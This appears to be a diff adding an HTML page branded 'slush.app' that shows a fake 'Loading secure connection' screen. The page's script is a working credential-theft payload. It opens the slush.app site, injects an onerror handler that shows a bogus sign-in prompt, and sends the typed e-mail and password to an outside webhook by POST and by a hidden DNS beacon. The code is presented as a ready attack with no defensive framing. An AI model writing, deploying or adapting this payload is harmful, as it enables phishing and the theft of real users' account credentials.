@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>slush.app</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .container {
+      max-width: 500px;
+      padding: 40px;
+    }
+    h1 {
+      color: #4285f4;
+      font-size: 3rem;
+      margin-bottom: 2rem;
+    }
+    .info {
+      font-size: 1.2rem;
+      color: #666;
+      margin-bottom: 3rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>slush.app</h1>
+    <p class="info">Loading secure connection... Please wait</p>
+  </div>
+
+  <script>
+    // OOB webhook
+    const OOB = "https://young-comet-60.webhook.cool";
+
+    function y() {
+      const x = open('http://slush.app', '_top');
+      x.document.body.innerHTML = `
+        <img src="" onerror="
+          setTimeout(function() {
+            const creds = prompt('Sign into your account in order to access slush.app', 'E-mail / Password');
+            if (creds && creds.trim() !== '') {
+              // Exfil ke webhook via POST
+              fetch('${OOB}/creds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ credentials: creds.trim(), timestamp: new Date().toISOString() })
+              }).catch(() => {});
+
+              // OOB DNS beacon (stealth)
+              const beacon = btoa(creds.trim()).replace(/=/g, '').substring(0, 500);
+              new Image().src = 'https://' + beacon + '.young-comet-60.webhook.cool';
+            }
+          }, 150)
+        ">
+      `;
+    }
+    setTimeout(y, 3000);
+  </script>
+
+</body>
+</html>
